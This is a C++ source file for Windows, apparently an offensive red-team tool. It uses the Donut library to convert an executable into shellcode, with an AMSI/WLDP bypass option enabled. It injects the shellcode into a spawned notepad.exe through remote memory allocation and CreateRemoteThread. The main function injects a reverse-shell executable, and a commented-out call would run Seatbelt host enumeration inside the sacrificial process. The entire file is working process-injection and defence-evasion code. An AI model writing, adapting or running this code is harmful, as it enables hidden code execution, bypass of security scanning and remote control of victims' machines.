
#include <windows.h> 
#include <tchar.h>
#include <stdio.h> 
#include <strsafe.h>
#include <processthreadsapi.h>

#include <iostream>
#include <fstream>

#include <donut.h>


#define BUFSIZE 4096 


int launchNotepad()
{
    TCHAR szCmdline[] = TEXT("notepad.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcess(NULL,
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION 

    return piProcInfo.dwProcessId;
}


// inject in a process a .exe
// get no output
int inject(std::string cmd, std::string args, int pid)
{
    // Donut
    DONUT_CONFIG c;
    memset(&c, 0, sizeof(c));

    // copy input file
    lstrcpyn(c.input, cmd.c_str(), DONUT_MAX_NAME - 1);

    // default settings
    c.inst_type = DONUT_INSTANCE_EMBED;     // file is embedded
    c.arch = DONUT_ARCH_X84;                // dual-mode (x86+amd64)
    c.bypass = DONUT_BYPASS_CONTINUE;       // continues loading even if disabling AMSI/WLDP fails
    c.format = DONUT_FORMAT_BINARY;         // default output format
    c.compress = DONUT_COMPRESS_NONE;       // compression is disabled by default
    c.entropy = DONUT_ENTROPY_DEFAULT;      // enable random names + symmetric encryption by default
    c.exit_opt = DONUT_OPT_EXIT_THREAD;     // default behaviour is to exit the thread
    c.thread = 1;                           // run entrypoint as a thread
    c.unicode = 0;                          // command line will not be converted to unicode for unmanaged DLL function
    lstrcpyn(c.param, args.c_str(), DONUT_MAX_NAME - 1);

    // generate the shellcode
    int err = DonutCreate(&c);
    if (err != DONUT_ERROR_SUCCESS) {
        printf("  [ Error : %s\n", DonutError(err));
        return 0;
    }

    printf("  [ loader saved to %s\n", c.output);

    DonutDelete(&c);

    std::ifstream input(c.output, std::ios::binary);
    std::string buffer(std::istreambuf_iterator<char>(input), {});

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injection %i", pid);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, buffer.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, buffer.data(), buffer.size(), NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
}

// creat a sacrificial process with stdout bind on us 
// inject a .exe as a thread of this process
// get the ouput on our console
int execAssembly(std::string cmd, std::string args)
{
    HANDLE g_hChildStd_IN_Rd = NULL;
    HANDLE g_hChildStd_IN_Wr = NULL;
    HANDLE g_hChildStd_OUT_Rd = NULL;
    HANDLE g_hChildStd_OUT_Wr = NULL;

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
    SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
    CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
    SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

    TCHAR szCmdline[] = TEXT("notepad.exe");
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    bSuccess = CreateProcess(NULL,
        szCmdline,     // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION 

    std::cout << "PID " << piProcInfo.dwProcessId << std::endl;

    inject(cmd, args, piProcInfo.dwProcessId);

    if (!bSuccess)
        std::cout << "CreateProcess" << std::endl;
    else
    {
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }

    printf("\n->Contents of child process STDOUT:\n\n");

    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    bSuccess = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);

    while(1)
    {
        bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;

        bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
        if (!bSuccess) break;
        
        // how to get interactive ???
        //bSuccess = ReadFile(hParentStdIn, chBuf, BUFSIZE, &dwRead, NULL);
        //if (!bSuccess || dwRead == 0) break;

        //bSuccess = WriteFile(g_hChildStd_IN_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        //if (!bSuccess || dwRead == 0) break;
    }

    return 0;
}


int main(int argc, char* argv[])
{
    int pid = launchNotepad();

    std::cout << "PID notepad " << pid << std::endl;

    {
        std::string cmd = "RevShellWindows.exe";
        std::string args = "";
        inject(cmd, args, pid);
    }

    {
        std::string cmd = "Seatbelt.exe";
        std::string args = "-group=system";
        //execAssembly(cmd, args);
    }
}